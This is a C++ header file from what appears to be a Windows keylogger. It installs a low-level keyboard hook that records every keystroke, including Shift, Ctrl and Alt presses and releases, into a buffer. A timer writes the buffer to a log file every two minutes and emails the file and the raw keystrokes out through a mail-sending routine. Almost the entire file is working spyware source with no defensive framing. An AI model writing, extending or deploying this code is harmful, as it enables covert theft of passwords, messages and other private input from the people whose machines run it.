#ifndef HOOK_H
#define HOOK_H

#include <iostream>
#include <fstream>
#include <windows.h>

#include "Keys.h"
#include "Timer.h"
#include "Sender.h"

std::string keyRec = ""; //initialize to Empty string, use to record KeyStroke and Log info. This String will be Flushed when encouter errors

void TimerSendMail()
{
    if(keyRec.empty())
        return;
    std::string last_file = IO::GenerateLog(keyRec);

    if(last_file.empty())
    {
        General::GenerateAppLog("File is empty, fail to create file");
        return;
    }

    int b = Mail::SendMail("Log [" + last_file + "]", "\nPlease attached file"
                           + keyRec,
                           IO::GetOurPath(true) + last_file);

    if(b!= 7)  //Mail sent failture
        General::GenerateAppLog("Send Mail Failed, ErrorCode:" +General::ToString(b));
    else
        keyRec = "";
}

Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite); //***Set frequency of sending Key Record, 2min, 2000 milisecs * 60***

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)  //Detect Hold and Release "Shift" key,record format [SHIFT][a][b], [/shift][a][b]
    {
        keyRec += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
            keyRec += '\n';
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL || key == VK_LCONTROL
                              ||key == VK_RCONTROL
                               ||key == VK_SHIFT
                                ||key == VK_RSHIFT
                                 ||key == VK_LSHIFT
                                  ||key == VK_MENU
                                   ||key == VK_LMENU
                                    ||key == VK_RMENU
                                     ||key == VK_CAPITAL
                                      ||key == VK_NUMLOCK
                                       ||key == VK_LWIN
                                        ||key == VK_RWIN
                                        )
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keyRec += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode,wparam,lparam);
}

bool InstallHook()
{
    General::GenerateAppLog("Hook established, start counter");
    MailTimer.StartTimer(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

bool UninstallHook()
{
    BOOL u = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool) u;
}

bool Hooked()
{
    return (bool)(eHook) == NULL;
}

#endif // HOOK_H
